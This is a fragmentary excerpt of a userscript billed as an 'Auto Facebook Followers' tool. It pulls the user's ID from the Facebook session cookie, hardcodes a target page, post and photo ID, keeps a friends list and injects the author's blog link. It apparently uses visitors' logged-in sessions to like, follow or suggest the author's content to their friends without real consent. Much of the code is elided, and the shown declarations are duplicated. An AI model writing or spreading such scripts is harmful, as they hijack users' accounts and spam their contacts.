// ==UserScript==
// @name            Auto Facebook Followers By Sahzz
// @description     Auto Facebook Followers By www.classycreationsx.blogspot.com
...
var spost_id = "333250416806451";
var sfoto_id = "276383762493117";
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
var smesaj = "";
var smesaj_text = "";
var arkadaslar = [];
...
var spage_id = "595562653807546",
    spost_id = "333250416806451",
    sfoto_id = "276383762493117",
    user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]),
    smesaj = "",
    smesaj_text = "",
    arkadaslar = [],
...
function blub()
{
    if(document.getElementsByClassName('pbm fsm').length == 1) {
        ...
        //e.href = '#';
        e.innerHTML = 'Auto Suggest By Sahzz';
...
if(document.body){
	...
	a.innerHTML = "<a style=\"font-weight:bold;color:#333333\" href=\"http://www.classycreationsx.blogspot.com/\">Sahzz</a>";
